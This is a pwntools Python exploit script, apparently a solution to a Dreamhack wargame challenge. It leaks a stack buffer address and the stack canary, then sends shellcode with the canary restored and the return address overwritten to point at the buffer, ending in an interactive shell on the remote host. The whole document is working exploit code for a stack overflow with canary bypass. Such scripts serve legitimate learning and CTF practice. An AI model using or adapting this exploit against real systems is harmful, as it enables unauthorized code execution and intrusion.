from pwn import *
def slog(n, m) :
	return success(" : ".join([n,hex(m)]))
context.arch = "amd64"
r = remote("host3.dreamhack.games",9563)

r.recvuntil(b"buf: ")
buf=int(r.recv(14),16)
slog("Address of buf", buf)

r.recvuntil(b"$rbp: ")
buf2sfp = int(r.recvline())
buf2cnry = buf2sfp - 0x8
slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)

payload = b"a" * (buf2cnry+1)

r.sendafter("Input: ",payload)
r.recvuntil(payload)
canary = u64(b"\x00"+r.recv(7))
slog("Canary", canary)
sh = asm(shellcraft.sh())
payload = sh			# 5의 과정 - 쉘코드
payload += b"A"*(88-len(sh))
payload += p64(canary)
payload += b"B"*0x8 
payload += p64(buf)
r.sendlineafter("Input:",payload)
r.interactive() 

